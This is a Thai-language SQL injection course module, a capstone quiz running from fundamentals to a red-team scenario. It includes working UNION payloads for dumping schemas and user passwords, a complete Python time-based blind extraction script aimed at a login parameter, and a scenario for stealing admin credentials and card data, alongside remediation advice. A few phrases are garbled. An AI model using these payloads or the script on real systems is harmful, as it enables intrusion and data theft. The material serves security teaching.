# Part 099: Capstone Assessment

## ภาพรวม

การประเมินความรู้ครบถ้วน - คำถาม และ ความท้าทายจากหลาย levels

**ขั้นตอนที่ 1556-1570**

---

## 1556. Level 1: Fundamental Questions

```
Q1: ผล SQL injection เกิดจากอะไร?
A: เกิดจากการนำ user input ไปต่อโดยตรงใน SQL query
   โดยไม่ validate หรือ parameterize

Q2: วิธีแก้ไข SQL injection ที่ดีที่สุด?
A: Parameterized queries (Prepared Statements)
   - Python: cursor.execute("... %s", (value,))
   - Java: PreparedStatement setString(1, value)
   - PHP: PDO->prepare() + execute()

Q3: ต่างกันยังไง Error-based vs Blind SQLi?
A: Error-based: ดูข้อมูลจาก error message โดยตรง
   Blind: ไม่เห็น error, ใช้ boolean (T/F) หรือ time delay

Q4: UNION injection ต้องการอะไร?
A: column count = เท่ากัน
   column types compatible
   ORDER BY หรือ NULL technique

Q5: WAF อ่านอะไรและป้องกัน SQLi ได้อย่างไร?
A: ตรวจหา patterns (UNION SELECT, OR 1=1 etc.)
   แต่ไม่ใช่วิธีหลัก - ต้องใช้ parameterized queries
```

---

## 1557. Level 2: Intermediate Challenges

```sql
-- Challenge 1: หา column count
GET /product?id=1 ORDER BY 1--
GET /product?id=1 ORDER BY 2--
...
-- เมื่อ error เป็น ORDER BY N → column count = N-1

-- Challenge 2: หา injectable columns (UNION)
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,NULL,NULL-- -
' UNION SELECT 1,2,NULL-- -
' UNION SELECT 1,2,3-- -
-- column ที่ reflect = injectable

-- Challenge 3: ดึง schema
' UNION SELECT 1,table_name,3 FROM information_schema.tables
    WHERE table_schema=database()-- -

-- Challenge 4: ดึง data
' UNION SELECT 1,username,password FROM users-- -

-- Challenge 5: จัดการวันที่ (Boolean blind)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
```

---

## 1558. Level 3: Advanced Scenarios

```python
# Challenge: Time-based extraction สำหรับ DB ที่ไม่มีออกพุต

import requests
import time
import string

def time_extract(url: str, param: str, query: str) -> str:
    result = ''
    
    # หาความยาวด้วย time-based binary search
    length = 0
    for n in range(1, 100):
        payload = f"' AND IF(LENGTH(({query}))={n},SLEEP(2),0)-- -"
        start = time.monotonic()
        requests.get(url, params={param: payload}, timeout=10)
        elapsed = time.monotonic() - start
        if elapsed > 1.8:
            length = n
            break
    
    # ดึงทีละ character
    chars = string.ascii_letters + string.digits + '!@#$_-{}'
    for pos in range(1, length + 1):
        for char in chars:
            payload = f"' AND IF(SUBSTRING(({query}),{pos},1)='{char}',SLEEP(2),0)-- -"
            start = time.monotonic()
            requests.get(url, params={param: payload}, timeout=10)
            elapsed = time.monotonic() - start
            if elapsed > 1.8:
                result += char
                print(f"\r[*] Extracting: {result}", end='')
                break
    
    print()
    return result

# เรียกใช้:
password = time_extract(
    'http://target.com/login',
    'username',
    'SELECT password FROM users WHERE username=\'admin\''
)
```

---

## 1559. Level 4: Red Team Assessment

```
Scenario: E-Commerce เต็มรูปแบบ

Objective:
1. ค้นหา SQL injection endpoints
2. ดึง admin credentials
3. ดึง customer credit cards
4. ประเมิน business impact
5. เชียร์ report

Recon Phase:
- Burp Suite: ส่งทุก request เข้า scanner
- SQLMap: --crawl=3 --batch
- Manual: ตรวจ forms, query strings, cookies

Exploitation:
- ใช้เทคนิคที่เหมาะสมในแต่ละจุด
- บันทึกทุกสิ่ง
- หยุดเมื่อได้สิ่งที่ต้องการ (ไม่ทำลาย production!)

Reporting CVSS:
- AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N = 9.8 CRITICAL

Remediations:
- Parameterized queries
- WAF tuning
- Data encryption
- Monitoring
```

---

## สรุป

Capstone Assessment:
- **L1 Fundamental** - concepts, parameterized queries
- **L2 Intermediate** - UNION, schema, data extraction
- **L3 Advanced** - time-based, blind extraction
- **L4 Red Team** - complete methodology

---

*Part 099 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
